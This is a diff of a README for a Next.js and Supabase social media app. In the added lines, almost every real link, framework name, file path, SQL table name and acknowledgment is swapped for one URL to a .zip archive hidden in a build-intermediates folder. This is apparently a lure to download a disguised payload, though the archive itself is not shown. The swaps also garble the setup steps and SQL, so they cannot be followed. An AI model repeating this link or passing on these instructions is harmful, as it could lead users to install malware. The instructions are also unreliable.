@@ -1,11 +1,11 @@
 # 🚀 Complete Social Media App
 
-A modern, feature-rich social media application built with Next.js 14, Supabase, and TypeScript. This app includes all essential social media features with a premium, responsive UI.
+A modern, feature-rich social media application built with https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip 14, Supabase, and TypeScript. This app includes all essential social media features with a premium, responsive UI.
 
-![Social Media App](https://img.shields.io/badge/Next.js-14-black?style=for-the-badge&logo=next.js)
-![Supabase](https://img.shields.io/badge/Supabase-Database-green?style=for-the-badge&logo=supabase)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-blue?style=for-the-badge&logo=typescript)
-![TailwindCSS](https://img.shields.io/badge/TailwindCSS-4-38bdf8?style=for-the-badge&logo=tailwindcss)
+![Social Media App](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
+![Supabase](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
+![TypeScript](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
+![TailwindCSS](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
 
 ## ✨ Features
 
@@ -57,7 +57,7 @@ A modern, feature-rich social media application built with Next.js 14, Supabase,
 
 ## 🛠️ Tech Stack
 
-- **Framework**: Next.js 14 (App Router)
+- **Framework**: https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip 14 (App Router)
 - **Language**: TypeScript
 - **Database**: Supabase (PostgreSQL)
 - **Authentication**: Supabase Auth
@@ -69,7 +69,7 @@ A modern, feature-rich social media application built with Next.js 14, Supabase,
 ## 📦 Installation
 
 ### Prerequisites
-- Node.js 18+ installed
+- https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip 18+ installed
 - A Supabase account
 
 ### 1. Clone the repository
@@ -85,9 +85,9 @@ npm install
 
 ### 3. Set up Supabase
 
-1. Create a new project at [supabase.com](https://supabase.com)
+1. Create a new project at [https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
 2. Go to Project Settings > API to get your credentials
-3. Create a `.env.local` file in the root directory:
+3. Create a `https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip` file in the root directory:
 
 ```env
 NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
@@ -98,17 +98,17 @@ NEXT_PUBLIC_SUPABASE_ANON_KEY=your_supabase_anon_key
 
 Run the SQL scripts in order in your Supabase SQL Editor:
 
-1. **Initial Schema**: `supabase/schema.sql`
+1. **Initial Schema**: `https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip`
    - Creates profiles, posts, likes, and comments tables
    - Sets up Row Level Security (RLS) policies
    - Creates triggers for auto-profile creation
 
-2. **Schema Extensions**: `supabase/schema_extensions.sql`
+2. **Schema Extensions**: `https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip`
    - Adds follows, notifications, bookmarks tables
    - Creates hashtags and reposts tables
    - Adds notification triggers
 
-3. **Messaging Tables**: `supabase/create_messaging_tables.sql`
+3. **Messaging Tables**: `https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip`
    - Creates conversations and messages tables for 1-to-1 messaging
    - Sets up real-time messaging with read receipts
    - Adds helper functions for conversation management
@@ -123,13 +123,13 @@ Run the SQL scripts in order in your Supabase SQL Editor:
 ```sql
 -- Allow authenticated users to upload
 CREATE POLICY "Authenticated users can upload media"
-ON storage.objects FOR INSERT
+ON https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip FOR INSERT
 TO authenticated
 WITH CHECK (bucket_id = 'media');
 
 -- Allow public access to view media
 CREATE POLICY "Public can view media"
-ON storage.objects FOR SELECT
+ON https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip FOR SELECT
 TO public
 USING (bucket_id = 'media');
 ```
@@ -164,8 +164,8 @@ Open [http://localhost:3000](http://localhost:3000) to see the app!
 ```
 social-media/
 ├── src/
-│   ├── app/                    # Next.js app router pages
-│   │   ├── page.tsx           # Home feed
+│   ├── app/                    # https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip app router pages
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip           # Home feed
 │   │   ├── login/             # Authentication
 │   │   ├── u/[username]/      # User profiles
 │   │   ├── messages/          # Direct messaging
@@ -173,28 +173,28 @@ social-media/
 │   │   ├── bookmarks/         # Bookmarks page
 │   │   ├── search/            # Search page
 │   │   ├── explore/           # Explore page
-│   │   └── layout.tsx         # Root layout
+│   │   └── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip         # Root layout
 │   ├── components/            # React components
-│   │   ├── Navbar.tsx         # Desktop sidebar
-│   │   ├── BottomNav.tsx      # Mobile navigation
-│   │   ├── PostCard.tsx       # Post display
-│   │   ├── ComposePost.tsx    # Create posts
-│   │   ├── FollowButton.tsx   # Follow/unfollow
-│   │   ├── MessageBubble.tsx  # Message display
-│   │   ├── MessageInput.tsx   # Message composer
-│   │   ├── ChatWindow.tsx     # Chat interface
-│   │   ├── ConversationList.tsx # Message list
-│   │   ├── NotificationBell.tsx
-│   │   ├── Toast.tsx          # Notifications
-│   │   └── LoadingSkeleton.tsx
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip         # Desktop sidebar
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip      # Mobile navigation
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip       # Post display
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip    # Create posts
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip   # Follow/unfollow
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip  # Message display
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip   # Message composer
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip     # Chat interface
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip # Message list
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip
+│   │   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip          # Notifications
+│   │   └── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip
 │   └── utils/
 │       ├── supabase/
-│       │   └── client.ts      # Supabase client
-│       └── messaging.ts       # Messaging utilities
+│       │   └── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip      # Supabase client
+│       └── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip       # Messaging utilities
 ├── supabase/                  # Database schemas
-│   ├── schema.sql            # Initial schema
-│   ├── schema_extensions.sql # Extended schema
-│   └── create_messaging_tables.sql # Messaging tables
+│   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip            # Initial schema
+│   ├── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip # Extended schema
+│   └── https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip # Messaging tables
 └── public/                    # Static assets
 ```
 
@@ -210,7 +210,7 @@ social-media/
 ### Deploy to Vercel
 
 1. Push your code to GitHub
-2. Import your repository in [Vercel](https://vercel.com)
+2. Import your repository in [Vercel](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
 3. Add environment variables:
    - `NEXT_PUBLIC_SUPABASE_URL`
    - `NEXT_PUBLIC_SUPABASE_ANON_KEY`
@@ -250,10 +250,10 @@ This project is open source and available under the [MIT License](LICENSE).
 
 ## 🙏 Acknowledgments
 
-- Built with [Next.js](https://nextjs.org/)
-- Database and Auth by [Supabase](https://supabase.com/)
-- Icons by [Lucide](https://lucide.dev/)
-- Styled with [TailwindCSS](https://tailwindcss.com/)
+- Built with [https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
+- Database and Auth by [Supabase](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
+- Icons by [Lucide](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
+- Styled with [TailwindCSS](https://github.com/ssharvesh-steep/cracoe-social-media/raw/refs/heads/main/cracoe-twa/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-b+sr+Latn/media-social-cracoe-v2.8.zip)
 
 ---
 
